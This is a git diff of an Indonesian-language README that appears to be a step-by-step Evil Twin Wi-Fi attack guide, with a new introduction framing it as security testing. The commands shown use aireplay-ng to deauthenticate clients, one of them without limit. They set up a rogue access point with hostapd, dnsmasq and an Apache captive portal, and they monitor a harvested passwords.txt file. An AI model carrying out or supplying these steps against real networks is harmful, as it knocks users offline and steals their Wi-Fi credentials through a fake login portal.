@@ -1,5 +1,12 @@
 # Evil Twin Attack
 
+Evil Twin Attack adalah teknik yang digunakan untuk menguji keamanan jaringan Wi‑Fi dengan cara membuat access point palsu yang meniru SSID dan konfigurasi access point asli, sehingga korban tanpa sadar terkoneksi ke AP palsu tersebut. Setelah korban terhubung, penyerang dapat memantau lalu lintas jaringan, melakukan man‑in‑the‑middle, atau menipu pengguna melalui captive portal untuk mendapatkan kredensial, tanpa perlu mengetahui password Wi‑Fi asli.
+
+## Persyaratan
+- Linux
+- 2 adapter Wi‑Fi (mendukung mode monitor dan AP)
+- Koneksi internet
+
 ## Instal Tools
 
 ```
@@ -28,13 +35,13 @@ airodump-ng --encrypt wpa [interface_deauth]
 airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface_deauth]
 ```
 
-#### 4. Jalankan Deauth Attack
+#### 4. Jalankan Serangan Deauth
 
 ```
 aireplay-ng -0 10 -a [bssid] [interface_deauth]
 ```
 
-#### 5. Konfigurasi IP
+#### 5. Konfigurasi IP Address
 
 ```
 ip addr flush dev [interface_ap]
@@ -42,7 +49,7 @@ ip addr add 10.10.10.1/24 dev [interface_ap]
 ip link set [interface_ap] up
 ```
 
-#### 6. Konfigurasi Hostapd
+#### 6. Konfigurasi Rogue AP
 
 ```
 nano hostapd.conf
@@ -60,7 +67,7 @@ auth_algs=1
 ignore_broadcast_ssid=0
 ```
 
-#### 7. Konfigurasi DNSmasq
+#### 7. Konfigurasi DHCP Server
 
 ```
 nano dnsmasq.conf
@@ -132,20 +139,20 @@ cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/00
 cp conf/apache2.conf /etc/apache2/sites-available/000-default.conf
 ```
 
-#### 14. Aktifkan Apache Rewrite
+#### 14. Aktifkan Modul Apache Rewrite
 
 ```
 a2enmod rewrite
 systemctl restart apache2
 ```
 
-#### 15. Jalankan DNSmasq
+#### 15. Jalankan DHCP Server
 
 ```
 dnsmasq -C dnsmasq.conf -d
 ```
 
-#### 16. Jalankan Hostapd
+#### 16. Jalankan Rogue AP
 
 ```
 hostapd hostapd.conf
@@ -157,7 +164,7 @@ hostapd hostapd.conf
 tail -f /var/www/html/passwords.txt
 ```
 
-#### 18. Jalankan Deauth Attack
+#### 18. Jalankan Serangan Deauth
 
 ```
 aireplay-ng -0 0 -a [bssid] [interface_deauth]
